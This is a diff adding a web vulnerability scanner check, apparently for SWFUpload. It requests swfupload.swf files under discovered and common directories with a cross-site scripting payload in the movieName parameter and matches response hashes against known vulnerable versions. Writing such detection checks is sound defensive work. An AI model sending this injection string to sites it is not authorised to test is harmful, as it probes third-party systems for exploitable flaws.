@@ -1,0 +1,125 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// directories to be tested
+var dirs    = new Array();
+var hashes  = new Array();
+// known vulnerable hashes
+hashes.push("8a6ce723dfc16fd8045e850f9495de21"); 
+hashes.push("7729e2cc5823c01e12ff5c29bcc8ef5f"); 
+hashes.push("cb08040a62d87be26803d2e6bf8437d3"); 
+hashes.push("cb8ed9f59bae76a0c77e3b15e0d604b1"); 
+hashes.push("7503c0af18c3975808309b550882fd88"); 
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testSWFUploadOnDir(dir)
+{
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = dir + "/swfupload.swf?movieName=%22]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//";		
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+            hash = plain2md5(lastJob.response.body);
+            //trace(hash);
+            
+            if (hashes.indexOf(hash) != -1) {
+                alert(dir + "/swfupload.swf", 'SWFUpload_XSS.xml', lastJob);
+            }
+		}
+	}		
+	
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = dir + "/swfupload_f9.swf?movieName=%22]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//";		
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+            hash = plain2md5(lastJob.response.body);
+            //trace(hash);
+            
+            if (hashes.indexOf(hash) != -1) {
+                alert(dir + "/swfupload.swf", 'SWFUpload_XSS.xml', lastJob);
+            }
+		}
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+function prepareDirectoriesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		//trace(sf.name);
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isDir)
+		{
+			dirName = sf.fullPath;			
+			if (sf.Name.indexOf("swfupload")!=-1) 
+			{
+			    if (dirName.charAt(dirName.length-1) == '/') dirName = dirName.substring(0, dirName.length-1);
+                if (dirs.indexOf(dirName) == -1)
+				    dirs.push(dirName);
+			}				
+		}	
+        
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			dirName = sf.fullPath;			
+			if (sf.Name == "swfupload.js" || sf.Name == "swfupload.swf") 
+			{
+			    dirName = dirName.replace("swfupload.js", "");
+                dirName = dirName.replace("swfupload.swf", "");
+                
+				if (dirs.indexOf(dirName) == -1)
+				    dirs.push(dirName);
+			}
+		}
+	}	
+    
+    var tested_common_dirs = getGlobalValue("swfupload_tested_common_dirs");
+    if (!tested_common_dirs)
+    {
+	    SetGlobalValue("swfupload_tested_common_dirs", 1, true);
+        
+        dirs.push("/engine/classes/swfupload/");
+        dirs.push("/html/js/misc/swfupload/");
+        dirs.push("/cms/themes/cp_themes/default/images/");
+        dirs.push("/surgemail/mtemp/surgeweb/tpl/shared/modules/");
+        dirs.push("/plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/");
+        dirs.push("/swfupload/");
+        dirs.push("/includes/swfupload/");
+        dirs.push("/js/swfupload/");
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirectoriesToBeTested(list);
+if (dirs.length > 0) 
+{
+	for (var i=0; i<dirs.length; i++)
+		testSWFUploadOnDir(dirs[i]);
+}
